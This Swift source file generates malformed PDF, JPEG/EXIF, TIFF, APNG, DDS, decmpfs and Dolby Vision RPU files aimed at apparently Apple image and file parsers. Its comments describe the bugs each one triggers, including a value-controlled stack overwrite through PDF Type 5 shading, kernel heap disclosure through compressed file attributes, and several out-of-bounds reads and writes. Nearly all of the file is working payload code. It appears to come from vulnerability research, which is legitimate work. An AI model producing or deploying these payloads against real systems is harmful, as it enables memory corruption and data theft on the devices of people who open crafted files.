import Foundation

// MARK: - Bit stream (MSB-first), used by the shading decoder and the RPU builder

struct BitWriter {
    private(set) var out: [UInt8] = []
    private var acc: UInt8 = 0
    private var nbits = 0

    mutating func put(_ value: UInt32, _ width: Int) {
        guard width > 0 else { return }
        for i in stride(from: width - 1, through: 0, by: -1) {
            acc = (acc << 1) | UInt8((value >> UInt32(i)) & 1)
            nbits += 1
            if nbits == 8 { out.append(acc); acc = 0; nbits = 0 }
        }
    }

    mutating func putExpGolomb(_ value: UInt32) {
        let v = value + 1
        var bits = 0
        while (v >> UInt32(bits)) > 1 { bits += 1 }
        for _ in 0..<bits { put(0, 1) }
        put(v, bits + 1)
    }

    mutating func flush() -> [UInt8] {
        if nbits > 0 { out.append(acc << (8 - nbits)); acc = 0; nbits = 0 }
        return out
    }
}

// MARK: - PDF

struct PDFBuilder {
    private var objects: [Int: (dict: String, stream: [UInt8]?)] = [:]

    mutating func add(_ n: Int, _ dict: String, _ stream: [UInt8]? = nil) {
        objects[n] = (dict, stream)
    }

    func data() -> Data {
        var out = Data("%PDF-1.7\n%\u{e2}\u{e3}\u{cf}\u{d3}\n".utf8)
        var offsets: [Int: Int] = [:]
        for n in objects.keys.sorted() {
            guard let obj = objects[n] else { continue }
            offsets[n] = out.count
            out.append(Data("\(n) 0 obj\n".utf8))
            out.append(Data(obj.dict.utf8))
            if let stream = obj.stream {
                out.append(Data("\nstream\n".utf8))
                out.append(Data(stream))
                out.append(Data("\nendstream".utf8))
            }
            out.append(Data("\nendobj\n".utf8))
        }
        let xrefPos = out.count
        let maxObj = objects.keys.max() ?? 0
        out.append(Data("xref\n0 \(maxObj + 1)\n0000000000 65535 f \n".utf8))
        for n in 1...max(maxObj, 1) {
            let off = offsets[n] ?? 0
            out.append(Data(String(format: "%010d 00000 n \n", off).utf8))
        }
        out.append(Data("trailer\n<< /Size \(maxObj + 1) /Root 1 0 R >>\nstartxref\n\(xrefPos)\n%%EOF\n".utf8))
        return out
    }
}

enum PDFPayload {

    /// CVE-2026-112611 — Type 5 (lattice Gouraud) shading.
    ///
    /// `/ColorSpace /DeviceGray` gives nc = 1; the `/Function` declares a `/Range` of
    /// `rangeDim` outputs. `_cg_shading_type5_draw` builds a 72-byte mesh record per
    /// triangle point with a 4-slot (32-byte) color area at +0x20 and calls
    /// `CGFunctionEvaluate`, which writes `rangeDim` doubles there. The mesh array is a
    /// stack VLA, so the last record's write walks up the frame. With `/C0 = /C1 = value`
    /// every written double is the same chosen bit pattern — the smash is value-controlled.
    static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
        let bpCoord = 32
        let bpComp = 8

        var bw = BitWriter()
        var verts: [(UInt32, UInt32)] = []
        for r in 0..<rows {
            for c in 0..<verticesPerRow {
                verts.append((UInt32(0x1000_0000 + c * 0x0800_0000), UInt32(0x1000_0000 + r * 0x0800_0000)))
            }
        }
        for (x, y) in verts {
            bw.put(x, bpCoord)
            bw.put(y, bpCoord)
            bw.put(0, bpComp)
        }
        let stream = bw.flush()

        let c = String(format: "%.17g", value)
        let list = Array(repeating: c, count: max(1, rangeDim)).joined(separator: " ")
        let rangeList = Array(repeating: "0 1", count: max(1, rangeDim)).joined(separator: " ")

        var pdf = PDFBuilder()
        pdf.add(1, "<< /Type /Catalog /Pages 2 0 R >>")
        pdf.add(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>")
        pdf.add(4, "<< /Length 8 >>", B.ascii(" /Sh1 sh"))
        pdf.add(5, "<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate \(bpCoord) /BitsPerComponent \(bpComp) /VerticesPerRow \(verticesPerRow) /Decode [0 200 0 200 0 1] /Function 6 0 R /Length \(stream.count) >>", stream)
        pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
        return pdf.data()
    }

    /// CVE-2026-112610 — CMap `/UseCMap` recursion with an unclamped codespace length.
    /// Reachability for the embedded-CMap vehicle was refuted in the source analysis;
    /// this ships as a negative-result probe so the differential is on record.
    static func cmapProbe(codespaceLength: Int = 128) -> Data {
        var cmap = ""
        cmap += "%!PS-Adobe-3.0 Resource-CMap\n"
        cmap += "/CIDInit /ProcSet findresource begin\n12 dict begin begincmap\n"
        cmap += "/CMapName /Cinder def\n/CMapType 1 def\n/WMode 0 def\n"
        cmap += "1 begincodespacerange\n"
        cmap += "<\(String(repeating: "0", count: 2))> <\(String(repeating: "F", count: max(2, codespaceLength)))>\n"
        cmap += "endcodespacerange\n"
        cmap += "1 begincidrange\n<00> <FF> 0\nendcidrange\n"
        cmap += "endcmap CMapName currentdict /CMap defineresource pop end end\n"
        let cmapBytes = B.ascii(cmap)

        var pdf = PDFBuilder()
        pdf.add(1, "<< /Type /Catalog /Pages 2 0 R >>")
        pdf.add(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        pdf.add(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>")
        pdf.add(4, "<< /Length 30 >>", B.ascii("BT /F1 12 Tf 10 100 Td <0041> Tj ET"))
        pdf.add(5, "<< /Type /Font /Subtype /Type0 /BaseFont /Cinder /Encoding 6 0 R /DescendantFonts [7 0 R] >>")
        pdf.add(6, "<< /Type /CMap /CMapName /Cinder /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /Length \(cmapBytes.count) >>", cmapBytes)
        pdf.add(7, "<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Cinder /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /DW 500 >>")
        return pdf.data()
    }
}

// MARK: - JPEG / EXIF

enum JPEGPayload {

    static func minimalSOI() -> [UInt8] { [0xFF, 0xD8] }

    /// Family D — a marker declaring a length far beyond the bytes present.
    /// 27.0 warns and keeps parsing (OOB read); 27.2 aborts.
    static func markerLength(declared: Int = 0xFFEE, actual: Int = 30) -> Data {
        var out = minimalSOI()
        out += [0xFF, 0xE1]
        out += [UInt8((declared >> 8) & 0xff), UInt8(declared & 0xff)]
        out += Array(repeating: 0x41, count: max(0, actual - 2))
        out += [0xFF, 0xD9]
        return Data(out)
    }

    /// Family J — EXIF UserComment whose value offset lands past the marker, so the
    /// short read leaves the malloc'd buffer tail uninitialised and the metadata read
    /// returns stale heap bytes.
    static func exifUserComment(count: Int = 0x400, valueOffset: Int = 0x4000) -> Data {
        var tiff = Data()
        tiff.append(contentsOf: [0x4D, 0x4D, 0x00, 0x2A])          // MM, 42
        tiff.append(contentsOf: B.be32(8))                          // IFD0 at 8
        tiff.append(contentsOf: B.be16(1))                          // 1 entry
        tiff.append(contentsOf: B.be16(0x9286))                     // UserComment
        tiff.append(contentsOf: B.be16(7))                          // UNDEFINED
        tiff.append(contentsOf: B.be32(UInt32(count)))
        tiff.append(contentsOf: B.be32(UInt32(valueOffset)))        // far past the block
        tiff.append(contentsOf: B.be32(0))                          // next IFD

        var out = minimalSOI()
        let payload = B.ascii("Exif\u{0}\u{0}") + [UInt8](tiff)
        let len = payload.count + 2
        out += [0xFF, 0xE1, UInt8((len >> 8) & 0xff), UInt8(len & 0xff)]
        out += payload
        out += [0xFF, 0xD9]
        return Data(out)
    }

    /// Family F — GPS IFD whose value offsets point far past the GPS blob.
    static func exifGPSOutOfBounds(delta: Int = 0x10000) -> Data {
        var tiff = Data()
        tiff.append(contentsOf: [0x4D, 0x4D, 0x00, 0x2A])
        tiff.append(contentsOf: B.be32(8))
        tiff.append(contentsOf: B.be16(1))
        tiff.append(contentsOf: B.be16(0x8825))                     // GPSInfoIFDPointer
        tiff.append(contentsOf: B.be16(4))                          // LONG
        tiff.append(contentsOf: B.be32(1))
        tiff.append(contentsOf: B.be32(26))                         // GPS IFD at 26
        tiff.append(contentsOf: B.be32(0))
        // GPS IFD
        tiff.append(contentsOf: B.be16(2))
        tiff.append(contentsOf: B.be16(0x0000))                     // GPSVersionID
        tiff.append(contentsOf: B.be16(1))
        tiff.append(contentsOf: B.be32(4))
        tiff.append(contentsOf: [2, 3, 0, 0])
        tiff.append(contentsOf: B.be16(0x0006))                     // GPSAltitude
        tiff.append(contentsOf: B.be16(5))                          // RATIONAL
        tiff.append(contentsOf: B.be32(1))
        tiff.append(contentsOf: B.be32(UInt32(26 + 18 + delta)))    // far past the blob
        tiff.append(contentsOf: B.be32(0))

        var out = minimalSOI()
        let payload = B.ascii("Exif\u{0}\u{0}") + [UInt8](tiff)
        let len = payload.count + 2
        out += [0xFF, 0xE1, UInt8((len >> 8) & 0xff), UInt8(len & 0xff)]
        out += payload
        out += [0xFF, 0xD9]
        return Data(out)
    }
}

// MARK: - TIFF

enum TIFFPayload {

    struct Entry {
        let tag: UInt16
        let type: UInt16
        let count: UInt32
        let value: [UInt8]      // raw payload bytes (little-endian), inline if <= 4
    }

    static func build(entries: [Entry], blobs: [(tag: UInt16, bytes: [UInt8])]) -> Data {
        let ifdOffset = 8
        let ifdSize = 2 + entries.count * 12 + 4
        var extraOffset = ifdOffset + ifdSize
        if extraOffset % 2 == 1 { extraOffset += 1 }

        var extra = Data()
        var blobOffsets: [UInt16: UInt32] = [:]
        for blob in blobs {
            blobOffsets[blob.tag] = UInt32(extraOffset + extra.count)
            extra.append(contentsOf: blob.bytes)
        }

        var out = Data()
        out.append(contentsOf: [0x49, 0x49, 0x2A, 0x00])
        out.append(contentsOf: B.le32(UInt32(ifdOffset)))
        out.append(contentsOf: B.le16(UInt16(entries.count)))
        for e in entries.sorted(by: { $0.tag < $1.tag }) {
            out.append(contentsOf: B.le16(e.tag))
            out.append(contentsOf: B.le16(e.type))
            out.append(contentsOf: B.le32(e.count))
            if e.value.count <= 4 {
                var v = e.value
                while v.count < 4 { v.append(0) }
                out.append(contentsOf: v)
            } else {
                out.append(contentsOf: B.le32(blobOffsets[e.tag] ?? 0))
            }
        }
        out.append(contentsOf: B.le32(0))
        if out.count < extraOffset { out.append(contentsOf: [UInt8](repeating: 0, count: extraOffset - out.count)) }
        out.append(extra)
        return out
    }

    /// Family A — planar configuration with more planes than the destination row can hold.
    ///
    /// Photometric=RGB gives a 3-channel destination row; SamplesPerPixel=4 with
    /// PlanarConfiguration=2 makes the 4th plane scatter past it. The scatter offset in
    /// 27.0 is a 32-bit multiply with no capacity compare against the row.
    static func planarScatter(width: Int = 64, height: Int = 64, spp: Int = 4, photometric: UInt16 = 2) -> Data {
        let bits: [UInt8] = (0..<spp).flatMap { _ in B.le16(8) }
        let stripBytes = width * height

        // Deterministic layout: IFD at 8, then BitsPerSample blob, then StripOffsets blob,
        // then the plane data. Every offset below is computed, not patched.
        let ifdOffset = 8
        let ifdSize = 2 + 10 * 12 + 4
        var extraOffset = ifdOffset + ifdSize
        if extraOffset % 2 == 1 { extraOffset += 1 }
        let bitsOffset = extraOffset
        let offsetsBlobOffset = bitsOffset + bits.count
        let stripBase = offsetsBlobOffset + spp * 4

        var stripOffsets: [UInt8] = []
        for i in 0..<spp { stripOffsets += B.le32(UInt32(stripBase + i * stripBytes)) }

        let entries: [Entry] = [
            Entry(tag: 256, type: 4, count: 1, value: B.le32(UInt32(width))),
            Entry(tag: 257, type: 4, count: 1, value: B.le32(UInt32(height))),
            Entry(tag: 258, type: 3, count: UInt32(spp), value: bits),
            Entry(tag: 259, type: 3, count: 1, value: B.le16(1)),
            Entry(tag: 262, type: 3, count: 1, value: B.le16(photometric)),
            Entry(tag: 273, type: 4, count: UInt32(spp), value: stripOffsets),
            Entry(tag: 277, type: 3, count: 1, value: B.le16(UInt16(spp))),
            Entry(tag: 278, type: 4, count: 1, value: B.le32(UInt32(height))),
            Entry(tag: 279, type: 4, count: UInt32(spp), value: (0..<spp).flatMap { _ in B.le32(UInt32(stripBytes)) }),
            Entry(tag: 284, type: 3, count: 1, value: B.le16(2)),
        ]

        var data = build(entries: entries, blobs: [(258, bits), (273, stripOffsets)])
        // pad to the computed strip base in case the builder aligned differently
        if data.count < stripBase {
            data.append(contentsOf: [UInt8](repeating: 0, count: stripBase - data.count))
        }
        for plane in 0..<spp {
            data.append(contentsOf: [UInt8](repeating: UInt8(0x40 + plane * 0x20), count: stripBytes))
        }
        return data
    }

    /// Family I — second strip physically truncated while StripByteCounts claims a full
    /// strip. 27.0 ignores the short read and scatters the uninitialised strip buffer
    /// into the output image.
    ///
    /// Strip offsets must actually point at the strip data. The 273 entry carries two
    /// u32 values (8 bytes > 4), so they live in the extra area as a blob and the IFD
    /// field holds the blob offset — a zeroed entry would send both strips to the file
    /// header and never truncate anything. Two-pass build: the placeholder blob fixes
    /// the layout (identical sizes both passes), the second pass writes real offsets.
    static func truncatedStrip(width: Int = 32, height: Int = 32) -> Data {
        let stripBytes = width * height / 2
        let placeholder: [UInt8] = [UInt8](repeating: 0, count: 8)
        var entries: [Entry] = [
            Entry(tag: 256, type: 4, count: 1, value: B.le32(UInt32(width))),
            Entry(tag: 257, type: 4, count: 1, value: B.le32(UInt32(height))),
            Entry(tag: 258, type: 3, count: 1, value: B.le16(8)),
            Entry(tag: 259, type: 3, count: 1, value: B.le16(1)),
            Entry(tag: 262, type: 3, count: 1, value: B.le16(1)),
            Entry(tag: 273, type: 4, count: 2, value: placeholder),
            Entry(tag: 277, type: 3, count: 1, value: B.le16(1)),
            Entry(tag: 278, type: 4, count: 1, value: B.le32(UInt32(height / 2))),
            Entry(tag: 279, type: 4, count: 2, value: B.le32(UInt32(stripBytes)) + B.le32(UInt32(stripBytes))),
            Entry(tag: 284, type: 3, count: 1, value: B.le16(1)),
        ]
        // pass 1: identical-size placeholder fixes the file length
        var data = build(entries: entries, blobs: [(273, placeholder)])
        let base = UInt32(data.count)
        // pass 2: real strip offsets — both passes produce the same layout
        let stripOffsets = B.le32(base) + B.le32(base + UInt32(stripBytes))
        entries[5] = Entry(tag: 273, type: 4, count: 2, value: stripOffsets)
        data = build(entries: entries, blobs: [(273, stripOffsets)])
        data.append(contentsOf: [UInt8](repeating: 0x33, count: stripBytes))
        data.append(contentsOf: [UInt8](repeating: 0x00, count: 16))   // truncated second strip
        return data
    }
}

// MARK: - PNG / APNG

enum PNGPayload {
    static func crc32(_ bytes: [UInt8]) -> UInt32 {
        var table = [UInt32](repeating: 0, count: 256)
        for i in 0..<256 {
            var c = UInt32(i)
            for _ in 0..<8 { c = (c & 1) != 0 ? (0xEDB88320 ^ (c >> 1)) : (c >> 1) }
            table[i] = c
        }
        var crc: UInt32 = 0xFFFFFFFF
        for b in bytes { crc = table[Int((crc ^ UInt32(b)) & 0xFF)] ^ (crc >> 8) }
        return crc ^ 0xFFFFFFFF
    }

    /// Stored (uncompressed) deflate wrapped in zlib — a valid stream with no compressor.
    static func zlibStore(_ input: [UInt8]) -> [UInt8] {
        var out: [UInt8] = [0x78, 0x01]
        var offset = 0
        if input.isEmpty { out += [0x01, 0x00, 0x00, 0xFF, 0xFF] }
        while offset < input.count {
            let take = min(65535, input.count - offset)
            out.append(offset + take >= input.count ? 0x01 : 0x00)
            out += B.le16(UInt16(take))
            out += B.le16(UInt16(~take & 0xFFFF))
            out += Array(input[offset..<(offset + take)])
            offset += take
        }
        var a: UInt32 = 1, b: UInt32 = 0
        for byte in input {
            a = (a + UInt32(byte)) % 65521
            b = (b + a) % 65521
        }
        out += B.be32((b << 16) | a)
        return out
    }

    static func chunk(_ type: String, _ data: [UInt8], declaredLength: Int? = nil, truncateTo: Int? = nil) -> [UInt8] {
        let body = truncateTo.map { Array(data.prefix($0)) } ?? data
        let len = UInt32(declaredLength ?? data.count)
        var out = B.be32(len) + B.ascii(type) + body
        out += B.be32(crc32(B.ascii(type) + body))
        return out
    }

    /// Family H — an fcTL chunk truncated mid-header.
    ///
    /// 27.0 reads 34 bytes at the fcTL offset and never checks the return value, so a file
    /// that ends inside the fcTL leaves a 34-byte stack buffer partly uninitialised and the
    /// frame geometry is parsed out of whatever was there. 27.2 reads 26 bytes and compares
    /// against 0x1a.
    static func apngTruncatedFCTL(mode: Int = 0) -> Data {
        var out: [UInt8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
        out += chunk("IHDR", B.be32(4) + B.be32(4) + [8, 6, 0, 0, 0])
        out += chunk("acTL", B.be32(2) + B.be32(0))
        var fctl: [UInt8] = B.be32(0) + B.be32(4) + B.be32(4) + B.be32(0) + B.be32(0)
        fctl += B.be16(1) + B.be16(10) + [0, 0]

        // a real 4x4 RGBA frame so the container itself is valid
        var rawRows: [UInt8] = []
        for _ in 0..<4 {
            rawRows.append(0)
            rawRows += [UInt8](repeating: 0x80, count: 16)
        }
        let idat = chunk("IDAT", zlibStore(rawRows))

        if mode == 2 {
            // control: a fully valid first fcTL (proves the container is otherwise sound)
            out += chunk("fcTL", fctl)
            out += idat
            out += chunk("IEND", [])
        } else if mode == 0 {
            // proper chunk header claiming 26 bytes, only 4 present, then IEND
            out += chunk("fcTL", fctl, declaredLength: 26, truncateTo: 4)
            out += idat
            out += chunk("IEND", [])
        } else {
            // file ends inside the fcTL: header + 4 data bytes, no CRC, no IEND
            out += B.be32(26) + B.ascii("fcTL") + Array(fctl.prefix(4))
        }
        return Data(out)
    }
}

// MARK: - DDS / KTX

enum TexturePayload {
    /// Family G — BC7 DDS whose single mip level is far shorter than the block math needs.
    static func bc7Short(width: Int = 512, height: Int = 512, dataBytes: Int = 64) -> Data {
        var out = Data("DDS ".utf8)
        out.append(contentsOf: B.le32(124))
        out.append(contentsOf: B.le32(0x00081007))
        out.append(contentsOf: B.le32(UInt32(height)))
        out.append(contentsOf: B.le32(UInt32(width)))
        out.append(contentsOf: B.le32(0))
        out.append(contentsOf: B.le32(0))
        out.append(contentsOf: B.le32(1))
        out.append(contentsOf: [UInt8](repeating: 0, count: 44))
        out.append(contentsOf: B.le32(32))
        out.append(contentsOf: B.le32(0x4))
        out.append(contentsOf: B.ascii("DX10"))
        out.append(contentsOf: [UInt8](repeating: 0, count: 20))
        out.append(contentsOf: B.le32(0x1000))
        out.append(contentsOf: B.le32(0) + B.le32(0) + B.le32(0) + B.le32(0))
        // DX10 header — DXGI_FORMAT_BC7_UNORM = 98, TEXTURECUBE off, arraySize 1
        out.append(contentsOf: B.le32(98) + B.le32(3) + B.le32(0) + B.le32(1) + B.le32(0))
        out.append(contentsOf: [UInt8](repeating: 0, count: max(1, dataBytes)))
        return out
    }
}

// MARK: - decmpfs (AppleFSCompression)

enum Decmpfs {
    static let magic: UInt32 = 0x636D_7066   // 'cmpf'
    static let typeZlibChunked: UInt32 = 4

    /// Build a `com.apple.decmpfs` xattr payload: type-4 chunked zlib, with per-chunk
    /// control over how many bytes each zlib stream actually produces.
    ///
    /// CVE-2026-113910 lives in AppleFSCompressionTypeZlib: a chunk that decompresses to
    /// fewer bytes than the chunk table promises leaves the tail of the kernel page buffer
    /// unwritten, and that stale kernel heap is what read() hands back to the app.
    static func chunkedXattr(uncompressedSize: Int, chunkCount: Int, producePerChunk: Int) -> Data {
        var out = Data()
        out.append(contentsOf: B.le32(magic))
        out.append(contentsOf: B.le32(typeZlibChunked))
        out.append(contentsOf: B.le64(UInt64(uncompressedSize)))

        var chunkBlobs: [[UInt8]] = []
        for _ in 0..<chunkCount {
            // flag 0x00 + zlib stream that decompresses to producePerChunk bytes of 0x41
            var raw: [UInt8] = []
            // stored (uncompressed) deflate blocks — trivially valid zlib
            let payload = [UInt8](repeating: 0x41, count: max(0, producePerChunk))
            raw.append(0x78); raw.append(0x01)          // zlib header, no dict
            var offset = 0
            if payload.isEmpty {
                raw += [0x01, 0x00, 0x00, 0xFF, 0xFF]   // final empty stored block
            }
            while offset < payload.count {
                let take = min(65535, payload.count - offset)
                raw.append(offset + take >= payload.count ? 0x01 : 0x00)
                raw += B.le16(UInt16(take))
                raw += B.le16(UInt16(~take & 0xFFFF))
                raw += Array(payload[offset..<(offset + take)])
                offset += take
            }
            raw += adler32(payload)
            chunkBlobs.append([0x00] + raw)
        }

        var offsets: [UInt32] = []
        var running: UInt32 = 0
        for blob in chunkBlobs {
            offsets.append(running)
            running += UInt32(blob.count)
        }
        offsets.append(running)
        for o in offsets { out.append(contentsOf: B.le32(o)) }
        for blob in chunkBlobs { out.append(contentsOf: blob) }
        return out
    }

    static func adler32(_ bytes: [UInt8]) -> [UInt8] {
        var a: UInt32 = 1, b: UInt32 = 0
        for byte in bytes {
            a = (a + UInt32(byte)) % 65521
            b = (b + a) % 65521
        }
        return B.be32((b << 16) | a)
    }
}

// MARK: - Dolby Vision RPU

enum RPUPayload {

    /// Build a Dolby Vision RP 2086 RPU byte sequence that drives
    /// `hevcbridgeParseVdrDmDataPayloadExMetadataBlocks` past one of the three
    /// fixed-capacity arrays (A: 4 × 28 B, B: 8 × 14 B, C: 5 × 36 B).
    ///
    /// The source research reconstructed the header grammar only through the entry
    /// checks (magic / rpu_type / rpu_format, verified live on the macOS twin); the
    /// remaining VDR structures are emitted here as a parameterised grammar probe so the
    /// parser's own error receipt tells you how far it got.
    static func probe(blockID: UInt32 = 1, blockCount: Int = 6, seed: UInt32 = 0x0BADF00D) -> Data {
        var bw = BitWriter()
        bw.put(0x19, 8)             // magic, byte 0
        bw.put(2, 6)                // rpu_type = 2 (DOVI)
        bw.put(0x12, 11)            // rpu_format
        bw.put(seed & 0x1F, 5)
        bw.put(1, 4)                // vdr_rpu_profile
        bw.put(0, 4)                // vdr_rpu_level
        bw.put(0, 1)                // vdr_seq_info_present_flag
        bw.put(1, 1)                // chroma_resampling_explicit_filter_flag
        bw.put(2, 2)                // coefficient_data_type
        bw.put(1, 1)                // el_spatial_resampling_filter_flag
        bw.put(0, 1)                // disable_residual_flag
        bw.put(0, 4)                // nln
        bw.put(1, 2)                // num_dm_data
        // DM data head: class-2 ext block loop
        bw.putExpGolomb(UInt32(blockCount))
        for i in 0..<blockCount {
            bw.putExpGolomb(0x40)                       // ext block length-ish
            bw.put(blockID, 8)                          // block_id
            // block-id 1 field grammar (u12 x3, u8 x6, u8 x2, u8 gate, u16 x3)
            bw.put(UInt32(0x100 + i), 12)
            bw.put(UInt32(0x101 + i), 12)
            bw.put(UInt32(0x102 + i), 12)
            for _ in 0..<6 { bw.put(0x26, 8) }
            bw.put(0x25, 8)
            bw.put(0x59, 8)
            bw.put(0x13, 8)                             // unlocks the u16 tail
            bw.put(UInt32(0x0FFF & (i * 0x111)), 16)
            bw.put(UInt32(0x0FFF & (i * 0x222)), 16)
            bw.put(UInt32(0x0FFF & (i * 0x333)), 16)
        }
        return Data(bw.flush())
    }
}
